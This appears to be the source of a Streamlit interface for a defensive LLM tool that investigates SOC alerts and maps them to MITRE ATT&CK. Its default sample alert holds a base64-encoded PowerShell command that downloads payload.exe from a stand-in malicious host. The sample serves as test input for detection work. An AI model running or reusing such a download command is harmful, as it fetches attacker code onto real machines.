"""Streamlit UI for LLM Alert Investigator."""

import json
from pathlib import Path
from typing import Any

import pandas as pd
import streamlit as st
from dotenv import load_dotenv

from src.investigator import AlertInvestigator
from src.preprocessor import AlertPreprocessor, load_alerts_from_file

load_dotenv()

st.set_page_config(
    page_title="LLM Alert Investigator",
    page_icon="🔍",
    layout="wide",
    initial_sidebar_state="expanded",
)

st.title("🔍 LLM Alert Investigator")
st.markdown(
    "AI-powered SOC alert investigation with MITRE ATT&CK mapping using RAG-augmented LLM"
)

st.sidebar.header("Configuration")

model = st.sidebar.selectbox(
    "LLM Model",
    ["gpt-4o", "gpt-4o-mini", "gpt-4-turbo"],
    index=0,
)

temperature = st.sidebar.slider(
    "Temperature",
    min_value=0.0,
    max_value=1.0,
    value=0.0,
    step=0.1,
)

retrieval_k = st.sidebar.slider(
    "Retrieval K (MITRE techniques)",
    min_value=1,
    max_value=10,
    value=5,
    step=1,
)

mitre_kb_path = st.sidebar.text_input(
    "MITRE KB Path",
    value="data/mitre_attack_kb",
)

st.sidebar.markdown("---")
st.sidebar.markdown("### About")
st.sidebar.markdown(
    """
This tool uses LangChain with RAG to:
- Map alerts to MITRE ATT&CK
- Generate investigation narratives
- Recommend next steps for analysts

**Design Parameters:**
- Temperature=0 for deterministic results
- k=5 for MITRE technique retrieval
- GPT-4o for analysis
"""
)

tab1, tab2, tab3 = st.tabs(["Single Alert", "Batch Processing", "Evaluation"])

with tab1:
    st.header("Single Alert Investigation")

    col1, col2 = st.columns([1, 2])

    with col1:
        st.subheader("Input Alert (JSON)")
        default_alert = {
            "timestamp": "2024-01-15T10:30:00Z",
            "src_ip": "192.168.1.100",
            "dst_ip": "10.0.0.50",
            "src_port": 54321,
            "dst_port": 443,
            "event_type": "network_connection",
            "process": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand cwBpAGcAbgBhAHQAdQByAGUAIABJAHYAbgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlAA==",
            "severity": "high",
        }

        alert_input = st.text_area(
            "Alert JSON",
            value=json.dumps(default_alert, indent=2),
            height=400,
        )

        investigate_btn = st.button("Investigate", type="primary", use_container_width=True)

    with col2:
        st.subheader("Investigation Results")

        if investigate_btn:
            try:
                alert = json.loads(alert_input)

                with st.spinner("Analyzing alert..."):
                    investigator = AlertInvestigator(
                        model=model,
                        temperature=temperature,
                        retrieval_k=retrieval_k,
                        mitre_kb_path=mitre_kb_path,
                    )

                    result = investigator.investigate(alert)

                st.success("Investigation complete!")

                st.subheader("MITRE ATT&CK Mapping")
                mitre_df = pd.DataFrame(result["mitre_mapping"])
                if not mitre_df.empty:
                    st.dataframe(mitre_df, use_container_width=True)
                else:
                    st.warning("No MITRE techniques mapped")

                st.subheader("Severity")
                severity = result.get("severity", "unknown")
                severity_color = {
                    "low": "🟢",
                    "medium": "🟡",
                    "high": "🟠",
                    "critical": "🔴",
                }.get(severity, "⚪")
                st.markdown(f"{severity_color} **{severity.upper()}**")

                st.subheader("Investigation Narrative")
                st.markdown(result.get("narrative", "No narrative generated"))

                st.subheader("Recommended Next Steps")
                next_steps = result.get("next_steps", [])
                if next_steps:
                    for i, step in enumerate(next_steps, 1):
                        st.markdown(f"{i}. {step}")
                else:
                    st.warning("No next steps generated")

                with st.expander("Retrieved MITRE Techniques"):
                    for i, tech in enumerate(result.get("retrieved_techniques", []), 1):
                        st.markdown(
                            f"**{i}. {tech['technique_id']} - {tech['technique_name']}**"
                        )
                        st.caption(f"Tactics: {tech['tactics']}")

                with st.expander("Normalized Alert"):
                    st.json(result.get("normalized_alert", {}))

                with st.expander("Enriched Alert"):
                    st.json(result.get("enriched_alert", {}))

            except json.JSONDecodeError:
                st.error("Invalid JSON format. Please check your input.")
            except Exception as e:
                st.error(f"Error during investigation: {e}")

with tab2:
    st.header("Batch Alert Processing")

    col1, col2 = st.columns([1, 2])

    with col1:
        st.subheader("Upload Alerts")

        upload_file = st.file_uploader(
            "Upload JSON file with alerts",
            type=["json"],
            help="File should contain a list of alert objects",
        )

        if upload_file:
            try:
                alerts = json.loads(upload_file.read().decode("utf-8"))
                if isinstance(alerts, dict):
                    alerts = alerts.get("alerts", [alerts])

                st.success(f"Loaded {len(alerts)} alerts")

                st.subheader("Preview")
                st.json(alerts[0] if alerts else {})

                process_btn = st.button(
                    "Process All Alerts", type="primary", use_container_width=True
                )

            except json.JSONDecodeError:
                st.error("Invalid JSON format")
                alerts = []
        else:
            alerts = []
            process_btn = False

    with col2:
        st.subheader("Batch Results")

        if process_btn and alerts:
            with st.spinner(f"Processing {len(alerts)} alerts..."):
                investigator = AlertInvestigator(
                    model=model,
                    temperature=temperature,
                    retrieval_k=retrieval_k,
                    mitre_kb_path=mitre_kb_path,
                )

                results = investigator.investigate_batch(alerts)

            st.success(f"Processed {len(results)} alerts")

            results_df = pd.DataFrame(
                [
                    {
                        "Severity": r.get("severity", "unknown"),
                        "Top Technique": r["mitre_mapping"][0]["technique_id"]
                        if r.get("mitre_mapping")
                        else "N/A",
                        "Confidence": r["mitre_mapping"][0]["confidence"]
                        if r.get("mitre_mapping")
                        else 0.0,
                        "Error": r.get("error", ""),
                    }
                    for r in results
                ]
            )

            st.dataframe(results_df, use_container_width=True)

            st.download_button(
                "Download Results (JSON)",
                data=json.dumps(results, indent=2),
                file_name="investigation_results.json",
                mime="application/json",
            )

            st.download_button(
                "Download Results (CSV)",
                data=results_df.to_csv(index=False),
                file_name="investigation_results.csv",
                mime="text/csv",
            )

with tab3:
    st.header("Evaluation Mode")

    col1, col2 = st.columns([1, 2])

    with col1:
        st.subheader("Upload Ground Truth")

        gt_file = st.file_uploader(
            "Upload ground truth CSV",
            type=["csv"],
            help="CSV with columns: alert_id, technique_id, severity, expected_content",
        )

        predictions_file = st.file_uploader(
            "Upload predictions JSON",
            type=["json"],
            help="JSON file with investigation results",
        )

        evaluate_btn = st.button(
            "Run Evaluation", type="primary", use_container_width=True
        )

    with col2:
        st.subheader("Evaluation Results")

        if evaluate_btn and predictions_file:
            try:
                predictions = json.loads(predictions_file.read().decode("utf-8"))

                if gt_file:
                    gt_df = pd.read_csv(gt_file)
                    ground_truth = gt_df.to_dict("records")
                else:
                    ground_truth = []

                from src.evaluator import AlertInvestigatorEvaluator

                evaluator = AlertInvestigatorEvaluator()

                if ground_truth:
                    report = evaluator.generate_evaluation_report(predictions, ground_truth)

                    st.subheader("MITRE Mapping Metrics")
                    mitre_metrics = report["mitre_mapping"]
                    col_m1, col_m2, col_m3 = st.columns(3)
                    col_m1.metric("Technique Accuracy", f"{mitre_metrics['technique_accuracy']:.2%}")
                    col_m2.metric("Top-1 Accuracy", f"{mitre_metrics['top1_accuracy']:.2%}")
                    col_m3.metric("Top-3 Accuracy", f"{mitre_metrics['top3_accuracy']:.2%}")

                    st.subheader("Narrative Quality")
                    narrative_metrics = report["narrative_quality"]
                    col_n1, col_n2, col_n3 = st.columns(3)
                    col_n1.metric("Avg Quality", f"{narrative_metrics['avg_quality']:.2f}/5")
                    col_n2.metric("Accuracy", f"{narrative_metrics['avg_accuracy']:.2f}/5")
                    col_n3.metric("Actionability", f"{narrative_metrics['avg_actionability']:.2f}/5")

                    st.subheader("Severity Classification")
                    severity_metrics = report["severity_classification"]
                    col_s1, col_s2, col_s3 = st.columns(3)
                    col_s1.metric("Accuracy", f"{severity_metrics['accuracy']:.2%}")
                    col_s2.metric("Precision", f"{severity_metrics['precision']:.2%}")
                    col_s3.metric("F1 Score", f"{severity_metrics['f1']:.2%}")

                    st.subheader("Summary")
                    st.json(report)

                else:
                    st.warning("No ground truth provided. Showing prediction statistics only.")

                    total = len(predictions)
                    successful = sum(
                        1 for p in predictions if "error" not in p and p.get("mitre_mapping")
                    )

                    col1, col2 = st.columns(2)
                    col1.metric("Total Alerts", total)
                    col2.metric("Successful", successful)

                    severity_counts = pd.Series(
                        [p.get("severity", "unknown") for p in predictions]
                    ).value_counts()

                    st.subheader("Severity Distribution")
                    st.bar_chart(severity_counts)

            except Exception as e:
                st.error(f"Error during evaluation: {e}")

st.sidebar.markdown("---")
st.sidebar.markdown(
    """
**Built with:**
- LangChain
- OpenAI GPT-4o
- FAISS
- MITRE ATT&CK
"""
)